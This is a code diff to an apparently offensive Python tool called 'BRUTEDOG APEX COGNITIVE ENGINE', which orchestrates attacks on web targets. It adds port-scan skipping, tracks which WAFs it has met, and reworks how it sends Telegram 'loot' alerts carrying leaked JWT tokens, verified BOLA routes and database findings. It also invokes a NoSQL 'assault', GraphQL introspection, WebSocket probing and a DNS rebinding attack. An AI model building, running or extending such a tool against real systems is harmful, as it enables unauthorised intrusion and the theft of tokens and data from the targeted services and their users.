@@ -111,6 +111,8 @@ RESET = "\033[0m"
 BOLD = "\033[1m"
 MAGENTA = "\033[95m"
 
+_background_tasks: set[asyncio.Task] = set()
+
 
 def info(message):
     sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
@@ -146,16 +148,26 @@ async def _safe_await(value):
     return value
 
 
+async def _send_alert_safe(loot_type, details):
+    try:
+        await asyncio.wait_for(send_telegram_alert(f"[APEX BREACH] {loot_type}", details), timeout=10)
+    except Exception:
+        pass
+
+
 def dispatch_critical_loot_alert(loot_type, details):
     """Fires Telegram alerts for verified findings without blocking the event loop."""
+    if not details:
+        return
     try:
         loop = asyncio.get_running_loop()
         if not loop.is_closed():
-            task = loop.create_task(send_telegram_alert(f"[APEX BREACH] {loot_type}", details))
-            task.add_done_callback(lambda t: t.exception() if not t.cancelled() else None)
+            task = loop.create_task(_send_alert_safe(loot_type, details))
+            _background_tasks.add(task)
+            task.add_done_callback(_background_tasks.discard)
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(f"[APEX BREACH] {loot_type}", details))
+            asyncio.run(_send_alert_safe(loot_type, details))
         except Exception:
             pass
 
@@ -171,7 +183,6 @@ async def invoke_module(func, *args, **kwargs):
             raw = await asyncio.to_thread(func, *args, **kwargs)
         return await _safe_await(raw)
     except TypeError as exc:
-        # Retry with positional target only if extra kwargs/args caused a signature mismatch
         if args and kwargs:
             try:
                 if asyncio.iscoroutinefunction(func):
@@ -226,6 +237,13 @@ def sanitize_endpoint_url(base_url: str, path: str) -> str:
     if not clean_path.startswith("/"):
         clean_path = "/" + clean_path
     return f"{clean_base}{clean_path}"
+
+
+def to_websocket_url(base_url: str, path: str = "/ws") -> str:
+    http_url = sanitize_endpoint_url(base_url, path)
+    parsed = urlsplit(http_url)
+    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
+    return urlunsplit((ws_scheme, parsed.netloc, parsed.path or "/ws", parsed.query, parsed.fragment))
 
 
 def get_target():
@@ -289,6 +307,7 @@ async def evaluate_response_heuristics(
     target_url,
     cognitive_brain,
     fingerprinter=None,
+    seen_defenses=None,
 ):
     findings = []
     mutated_payloads = []
@@ -307,12 +326,18 @@ async def evaluate_response_heuristics(
     for waf_name, pattern in HEURISTIC_SIGNATURES.items():
         if waf_name in ("Cloudflare WAF", "AWS API Gateway"):
             if pattern.search(header_str) or pattern.search(body_lower):
-                info(f"[TACTICAL REFLEX] Defense profile matched: {waf_name}. Adjusting pacing & headers.")
+                if seen_defenses is None or waf_name not in seen_defenses:
+                    if seen_defenses is not None:
+                        seen_defenses.add(waf_name)
+                    info(f"[TACTICAL REFLEX] Defense profile matched: {waf_name}. Adjusting pacing & headers.")
         elif waf_name == "JWT Token Leak":
             jwt_matches = pattern.findall(body_text)
             if jwt_matches:
                 success(f"[LOOT REFLEX] Token pattern detected at {endpoint}.")
-                dispatch_critical_loot_alert("JWT Token Leak", {"endpoint": endpoint, "token": jwt_matches[0][:30] + "..."})
+                dispatch_critical_loot_alert(
+                    "JWT Token Leak",
+                    {"endpoint": endpoint, "token": jwt_matches[0][:30] + "..."},
+                )
                 findings.append({"type": "JWT_TOKEN_LEAK", "token": jwt_matches[0]})
 
     if cognitive_brain:
@@ -330,7 +355,10 @@ async def evaluate_response_heuristics(
                 reasoning = cognitive_result.get("reasoning")
                 success(f"[COGNITIVE PIVOT] Adaptation recorded: {reasoning}")
                 findings.append({"type": "COGNITIVE_PIVOT_SUCCESS", "evidence": reasoning})
-                dispatch_critical_loot_alert("Cognitive Autonomous Pivot", {"endpoint": endpoint, "evidence": reasoning})
+                dispatch_critical_loot_alert(
+                    "Cognitive Autonomous Pivot",
+                    {"endpoint": endpoint, "evidence": reasoning},
+                )
         except Exception:
             pass
 
@@ -435,6 +463,7 @@ async def execute_endpoint_strike(
     fingerprinter,
     target_url,
     cognitive_brain,
+    seen_defenses=None,
 ):
     base_path = getattr(transport, "base_path", "") or ""
     raw_ep = f"{base_path}{path}" if base_path and not str(path).startswith(base_path) else str(path)
@@ -496,6 +525,7 @@ async def execute_endpoint_strike(
             target_url,
             cognitive_brain,
             fingerprinter=fingerprinter,
+            seen_defenses=seen_defenses,
         )
 
         if findings:
@@ -508,6 +538,10 @@ async def execute_endpoint_strike(
 
 
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
+    opts = options if isinstance(options, dict) else {}
+    skip_port_scan = bool(opts.get("skip_port_scan", False))
+    seen_defenses: set[str] = set()
+
     section("BRUTEDOG APEX COGNITIVE ENGINE v8.8")
     try:
         raw_target = target_host if target_host else get_target()
@@ -534,13 +568,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     for addr in addresses:
         success(f"Resolved IP: {addr}")
 
-    section("PORT SCANNING & RECON")
-    try:
-        scan_res = await invoke_module(run_port_scanner, host, concurrency=25)
-        if isinstance(scan_res, dict) and scan_res.get("status") == "COMPLETED":
-            success(f"Port scan completed. Open ports: {len(scan_res.get('open_ports', []))}")
-    except Exception as exc:
-        warning(f"Port scanner warning: {exc}")
+    if not skip_port_scan:
+        section("PORT SCANNING & RECON")
+        try:
+            scan_res = await invoke_module(run_port_scanner, host, concurrency=25)
+            if isinstance(scan_res, dict) and scan_res.get("status") == "COMPLETED":
+                success(f"Port scan completed. Open ports: {len(scan_res.get('open_ports', []))}")
+        except Exception as exc:
+            warning(f"Port scanner warning: {exc}")
 
     start_time = time.monotonic()
     transport = SecureTransport(target_url)
@@ -606,12 +641,13 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 warning(f"Module warning ({getattr(func, '__name__', str(func))}): {exc}")
 
         if bola_routes:
-            warning(f"Checking {len(bola_routes)} candidate routes.")
+            warning(f"Checking {len(bola_routes)} candidate BOLA routes.")
             for route in bola_routes:
                 clean_route = sanitize_endpoint_url(target_url, route)
-                dispatch_critical_loot_alert("BOLA Route Verified", {"route": clean_route})
                 try:
-                    await invoke_module(execute_live_login_verification, target_url=target_url, endpoint=clean_route)
+                    ver = await invoke_module(execute_live_login_verification, target_url=target_url, endpoint=clean_route)
+                    if ver:
+                        dispatch_critical_loot_alert("BOLA Route Verified", {"route": clean_route})
                 except Exception as exc:
                     warning(f"Verification warning on {clean_route}: {exc}")
 
@@ -629,6 +665,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                     fingerprinter,
                     target_url,
                     cognitive_brain,
+                    seen_defenses=seen_defenses,
                 )
 
         tasks = [asyncio.create_task(worker(p)) for p in discovered_paths]
@@ -642,7 +679,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
         try:
             db_loot = await invoke_module(run_nosql_assault, target_url, port=port, use_ssl=secure)
-            if db_loot:
+            if isinstance(db_loot, (list, dict)) and db_loot:
                 dispatch_critical_loot_alert("Database Finding", {"target": target_url})
         except Exception as exc:
             error(f"Database check error: {exc}")
@@ -678,12 +715,13 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
             gql_eng = GraphQLIntrospector(target_url)
             gql_res = await invoke_module(gql_eng.run_introspection, "/graphql")
-            if gql_res:
-                dispatch_critical_loot_alert("GraphQL Introspection Result", gql_res)
+            if isinstance(gql_res, (dict, list)) and gql_res:
+                dispatch_critical_loot_alert("GraphQL Introspection Result", {"target": target_url})
 
-            ws_res = await invoke_module(audit_websocket, sanitize_endpoint_url(target_url, "/ws"))
-            if ws_res:
-                dispatch_critical_loot_alert("WebSocket Check Result", {"target": target_url})
+            ws_url = to_websocket_url(target_url, "/ws")
+            ws_res = await invoke_module(audit_websocket, ws_url)
+            if isinstance(ws_res, (dict, list)) and ws_res:
+                dispatch_critical_loot_alert("WebSocket Check Result", {"target": ws_url})
 
             dns_reb = DNSRebindingOrchestrator(target_url)
             await invoke_module(dns_reb.execute_rebinding_attack, transport)
